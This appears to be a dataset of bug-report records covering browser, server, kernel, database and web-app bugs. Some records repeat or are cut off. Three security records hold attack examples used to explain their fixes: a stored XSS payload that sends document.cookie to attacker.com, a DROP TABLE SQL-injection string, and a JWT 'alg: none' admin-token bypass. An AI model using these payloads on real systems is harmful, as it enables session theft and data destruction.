description: NullPointerException when rendering dynamic SVG graphics using Canvas2D context on high-DPI displays. The scaling factor is improperly calculated, leading to a null drawing surface descriptor. The crash occurs in layout/svg/nsSVGCanvasRenderer.cpp:322 when trying to access the device context bounding box dimensions.
resolution: Check if active draw surface descriptor is null before invoking scaling coefficients. Re-scale surface variables after context is initialized.
root_cause: Unchecked null assignment when rendering device context scales are changed on high-DPI screens.
chunk_content:
Bug ID: MOZ-492041
Project: Firefox
Component: Core: SVG Rendering
Severity: Critical
Source: Mozilla
Title: Firefox - Core: SVG Rendering - NullPointerException when rendering dynamic SVG graphics using Canvas2D context on high-DPI displays. The scaling factor is improperly calculated, leading to a null drawing surface descriptor. The crash occurs in layout/svg/nsSVGCanvasRenderer.cpp:322 when trying to access the device context bounding box dimensions.
Root Cause: Unchecked null assignment when rendering device context scales are changed on high-DPI screens.
Resolution: Check if active draw surface descriptor is null before invoking scaling coefficients. Re-scale surface variables after context is initialized.
Status: Resolved

description: Apache HTTP Server memory leak in mod_rewrite when using complex regex substitution in Directory context. A slow memory leak has been identified in mod_rewrite.c when executing complex rewrite rules containing capture group backreferences in a <Directory> block. The rewrite engine allocates memory for the matched substrings using the request pool but fails to release intermediate cleanups during internal subrequests.
resolution: Clear internal temp pools within the subrequest rewrites buffer loop using apr_pool_clear helper API.
root_cause: Failure to release memory allocations for intermediate capture group backreferences inside requests loop.
chunk_content:
Bug ID: HTTPD-99321

Component: modules/mod_rewrite
Severity: High
Source: Apache

A slow memory leak has been identified in mod_rewrite.c when executing complex rewrite rules containing capture group backreferences in a <Directory> block. The rewrite engine allocates memory for the matched substrings using the request pool but fails to release intermediate cleanups during internal subrequests.
Root Cause: Failure to release memory allocations for intermediate capture group backreferences inside requests loop.
Resolution: Clear internal temp pools within the subrequest rewrites buffer loop using apr_pool_clear helper API.
Status: Resolved

description: Deadlock in Workspace Lock Manager when saving project metadata during autobuild operation. A deadlock occurs between the UI Thread and the Autobuilder job thread when saving project metadata files. The UI thread holds the workspace lock (IWorkspaceRoot) and waits for the Autobuilder thread to complete a file index compile. Simultaneously, the Autobuilder thread requests the workspace metadata lock. This results in a complete IDE freeze.
resolution: Reorder lock acquisitions so workspace metadata locking always precedes file compilation indices tasks.
root_cause: Circular lock dependencies between UI Thread and Autobuilder thread waiting for workspace resource locks.

Simultaneously, the Autobuilder thread requests the workspace metadata lock. This results in a complete IDE freeze.

Resolution: Reorder lock acquisitions so workspace metadata locking always precedes file compilation indices tasks.

description: Kernel panic - Not syncing: Attempted to kill init! in ext4 filesystem journal block release. Kernel crash occurs during heavy ext4 filesystem writes when journaling block release commits. The panic handler reports a double-free of block structures in fs/ext4/mballoc.c. The bug is triggered under high I/O workloads when a block allocation request overlaps with a concurrent file system sync (fsync) call.
resolution: Introduce a mutex block lock around ext4 journal buffer release calls during block synchronization.
root_cause: Race condition leading to a double-free in mballoc block allocator when synchronization overlaps block releases.

The bug is triggered under high I/O workloads when a block allocation request overlaps with a concurrent file system sync (fsync) call.
Root Cause: Race condition leading to a double-free in mballoc block allocator when synchronization overlaps block releases.
Resolution: Introduce a mutex block lock around ext4 journal buffer release calls during block synchronization.

description: SQL Injection vulnerability in search filter parser due to unescaped query string interpolation. A SQL injection vulnerability exists in the query builder. The endpoint /api/v1/search interpolates user-provided search filters directly into the PostgreSQL SELECT statement: SELECT * FROM items WHERE name LIKE '% + query + %'. Using input like %'; DROP TABLE items; -- results in arbitrary SQL execution.
resolution: Replace string interpolation with parameterized queries using SQLAlchemy bind parameter binding.
root_cause: Direct string concatenation of user-provided query search strings inside backend SQL queries.

description: PostgreSQL Connection Pool exhaustion under high concurrent load (HTTP 500 Internal Server Error). The application returns '500 Internal Server Error: Database Connection Timeout' after running under a load of 150 requests/sec. Logs show: sqlalchemy.exc.TimeoutError: QueuePool limit of size 5 overflow 10 has been exceeded, connection close failed. The bug occurs because the session generator get_db() in FastAPI routes is not being called as a context manager inside async task threads, leaving db connections open in the background.
resolution: Wrap database connections inside context managers to ensure sessions are closed in finally blocks.
root_cause: Database connection leaks caused by session objects not being closed when request threads complete.

The bug occurs because the session generator get_db() in FastAPI routes is not being called as a context manager inside async task threads, leaving db connections open in the background.
Root Cause: Database connection leaks caused by session objects not being closed when request threads complete.
Resolution: Wrap database connections inside context managers to ensure sessions are closed in finally blocks.
Status: Open

description: JWT Auth Token validation bypass when token is signed with None algorithm. The JWT authentication backend accepts tokens signed with the 'none' algorithm. A malicious user can craft an authorization header containing a token where the header specifies 'alg': 'none' and the payload specifies 'role': 'admin'. The library PyJWT / python-jose incorrectly bypasses signature verification when 'none' is allowed in the algorithms list.
resolution: Explicitly enforce HS256 algorithm validation inside jwt.decode calls, removing 'none' from accepted list.
root_cause: Cryptographic signature validation bypass by permitting the 'none' algorithm in incoming headers.

The library PyJWT / python-jose incorrectly bypasses signature verification when 'none' is allowed in the algorithms list.

Resolution: Explicitly enforce HS256 algorithm validation inside jwt.decode calls, removing 'none' from accepted list.

description: Cross-Site Scripting (XSS) in comment text area due to unescaped HTML element insertion. A stored XSS vulnerability exists in the comments section. Users can submit comments containing raw scripts: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>. When the comment list is loaded, the DOM inserts the comment directly using element.innerHTML instead of element.textContent, causing the browser to execute the script in the context of the user's session.
resolution: Sanitize and escape user inputs, and replace element.innerHTML bindings with element.textContent in React components.
root_cause: Direct insertion of unescaped user-supplied inputs into the DOM tree using innerHTML properties.

When the comment list is loaded, the DOM inserts the comment directly using element.innerHTML instead of element.textContent, causing the browser to execute the script in the context of the user's session.
Root Cause: Direct insertion of unescaped user-supplied inputs into the DOM tree using innerHTML properties.
Resolution: Sanitize and escape user inputs, and replace element.innerHTML bindings with element.textContent in React components.
Status: Resolved

description: TCP connection drop during heavy socket recycling under synthetic network load. A kernel crash occurs when net.ipv4.tcp_tw_recycle is enabled and synthetic network load drops packets during high socket requests. The TCP routing table marks packet sequence timestamps out of synchronization, dropping valid connections.
resolution: Deprecate tcp_tw_recycle option and enforce strict sequence validation checks inside net/ipv4/tcp_input.c.
root_cause: Sequence timestamp mismatches when reusing TCP sockets rapidly under lossy network layers.

Resolution: Deprecate tcp_tw_recycle option and enforce strict sequence validation checks inside net/ipv4/tcp_input.c.

description: OutOfMemoryError in Cassandra storage coordinator during large partition scans. During query execution on partitions larger than 50MB, Cassandra nodes crash with java.lang.OutOfMemoryError: Java heap space. The issue occurs because the coordinator node fetches the entire rows list of the partition into RAM to perform read repairs, rather than streaming pagination chunks.
resolution: Paginating read repair queries using chunked streaming buffers instead of loading full partitions into heap.
root_cause: Loading large, un-paginated DB partitions completely into coordinator heap memory.
